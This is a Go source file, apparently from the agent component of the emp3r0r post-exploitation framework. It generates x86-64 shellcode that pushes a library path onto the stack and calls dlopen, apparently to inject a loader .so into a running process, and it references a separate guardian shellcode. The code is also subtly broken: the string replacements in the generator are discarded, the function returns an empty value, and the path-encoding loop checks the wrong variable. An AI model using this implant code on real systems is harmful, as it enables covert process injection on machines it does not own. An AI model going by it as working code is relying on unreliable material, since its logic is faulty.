package agent

import (
	"encoding/hex"
	"fmt"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

var (
	dlopen_shellcode = "31f0" + "31ff" + "31f6" +
		// filename is path to loader.so
		// to be replaced with
		// movabs rdi, 0xdeadbeefdeadbeef; push rdi
		// opcode is 48bfdeadbeefdeadbeef; 57
		"filename" +
		"40b602" +
		"48b830d9320c047f0000" + "ffd0" // movabs rax, 0x7f040c32d930
	// "cc" // int3
	guardian_shellcode = emp3r0r_data.GuardianShellcode
)

// dlopen_addr: eg. 30d9320c047f
// path: eg. /usr/lib/x86_64-linux-gnu/libc++.so.1
func gen_dlopen_shellcode(path, dlopen_addr string) (shelcode string) {
	push_filename_hex := push_filename_asm(path)
	strings.ReplaceAll(dlopen_shellcode, "filename", push_filename_hex)
	strings.ReplaceAll(dlopen_shellcode, "30d9320c047f", dlopen_addr)

	return
}

func push_filename_asm(path string) (push_filename_hex string) {
	if len(path) <= 8 {
		so_path_hex := hex.EncodeToString([]byte(path))
		push_filename_hex := "48bf" + so_path_hex + "57"

		return push_filename_hex
	}
	path_hex := ""

	for _, char := range path {
		b := []byte(string(char))
		if len(push_filename_hex)/2 == 8 {
			push_filename_hex += "48bf" + path_hex + "57"
		}
		path_hex += hex.EncodeToString(b)
	}

	if len(path_hex)/2 < 8 {
		padding := 8 - len(path_hex)/2
		path_hex = fmt.Sprintf("%s%s", path_hex, strings.Repeat("00", padding))
		push_filename_hex += "48bf" + path_hex + "57"
		push_filename_hex += fmt.Sprintf("4883c4%x4889e7", padding)
	}
	return
}
